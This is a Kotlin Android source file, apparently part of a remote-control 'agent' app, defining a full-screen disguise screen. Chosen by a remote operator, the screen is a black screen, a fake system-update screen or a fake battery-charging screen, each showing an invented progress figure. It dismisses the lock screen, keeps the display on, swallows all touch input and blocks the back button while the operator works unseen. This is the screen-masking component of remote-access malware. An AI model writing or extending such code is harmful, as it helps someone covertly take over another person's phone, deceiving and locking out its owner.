package com.droidview.agent

import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView

/**
 * DisguiseActivity: Tela nativa em tela cheia do Android que aplica os modos de disfarce
 * selecionados pelo operador (Tela Preta, Atualização do Sistema, Carregando Bateria, Imagem Customizada).
 * Trava o toque físico para o usuário local e mantém o display ativo e controlado remotamente.
 */
class DisguiseActivity : Activity() {

    companion object {
        const val EXTRA_DISGUISE_TYPE = "type"
        const val EXTRA_PROGRESS = "progress"
        const val ACTION_DISGUISE_CLEAR = "com.droidview.agent.DISGUISE_CLEAR"
    }

    private var clearReceiver: BroadcastReceiver? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Configura tela cheia sem barras de status e mantém display acordado
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.setDecorFitsSystemWindows(false)
        }

        val type = intent.getStringExtra(EXTRA_DISGUISE_TYPE) ?: "black"
        val progress = intent.getIntExtra(EXTRA_PROGRESS, 32)

        val rootLayout = FrameLayout(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
            setBackgroundColor(Color.BLACK)
        }

        when (type) {
            "black" -> {
                rootLayout.setBackgroundColor(Color.BLACK)
            }
            "update" -> {
                val container = LinearLayout(this).apply {
                    orientation = LinearLayout.VERTICAL
                    gravity = Gravity.CENTER
                    layoutParams = FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.MATCH_PARENT,
                        FrameLayout.LayoutParams.MATCH_PARENT
                    )
                    setBackgroundColor(Color.parseColor("#050811"))
                }

                val spinner = ProgressBar(this).apply {
                    isIndeterminate = true
                    layoutParams = LinearLayout.LayoutParams(160, 160).apply {
                        bottomMargin = 48
                    }
                }

                val title = TextView(this).apply {
                    text = "Instalando atualização do sistema..."
                    textSize = 18f
                    setTextColor(Color.WHITE)
                    gravity = Gravity.CENTER
                }

                val percentText = TextView(this).apply {
                    text = "$progress%"
                    textSize = 24f
                    setTextColor(Color.parseColor("#00E5FF"))
                    gravity = Gravity.CENTER
                    setPadding(0, 16, 0, 32)
                }

                val subtitle = TextView(this).apply {
                    text = "Não desligue o telefone. O sistema será reiniciado automaticamente ao concluir."
                    textSize = 12f
                    setTextColor(Color.parseColor("#94A3B8"))
                    gravity = Gravity.CENTER
                    setPadding(48, 0, 48, 0)
                }

                container.addView(spinner)
                container.addView(title)
                container.addView(percentText)
                container.addView(subtitle)
                rootLayout.addView(container)
            }
            "battery" -> {
                val container = LinearLayout(this).apply {
                    orientation = LinearLayout.VERTICAL
                    gravity = Gravity.CENTER
                    layoutParams = FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.MATCH_PARENT,
                        FrameLayout.LayoutParams.MATCH_PARENT
                    )
                    setBackgroundColor(Color.parseColor("#030805"))
                }

                val title = TextView(this).apply {
                    text = "⚡ Carregando Bateria"
                    textSize = 20f
                    setTextColor(Color.parseColor("#22C55E"))
                    gravity = Gravity.CENTER
                    setPadding(0, 0, 0, 24)
                }

                val percentText = TextView(this).apply {
                    text = "$progress%"
                    textSize = 42f
                    setTextColor(Color.parseColor("#22C55E"))
                    gravity = Gravity.CENTER
                }

                container.addView(title)
                container.addView(percentText)
                rootLayout.addView(container)
            }
        }

        setContentView(rootLayout)

        // Registra receptor para fechar imediatamente quando o operador desativar a tela
        clearReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                finish()
            }
        }
        val filter = IntentFilter(ACTION_DISGUISE_CLEAR)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(clearReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(clearReceiver, filter)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        clearReceiver?.let {
            try {
                unregisterReceiver(it)
            } catch (_: Exception) {}
        }
    }

    // Trava toque físico para o usuário local no aparelho
    override fun onTouchEvent(event: MotionEvent?): Boolean {
        return true
    }

    // Bloqueia botão voltar físico do aparelho
    override fun onBackPressed() {
        // Bloqueado intencionalmente enquanto tela de disfarce estiver ativa
    }
}
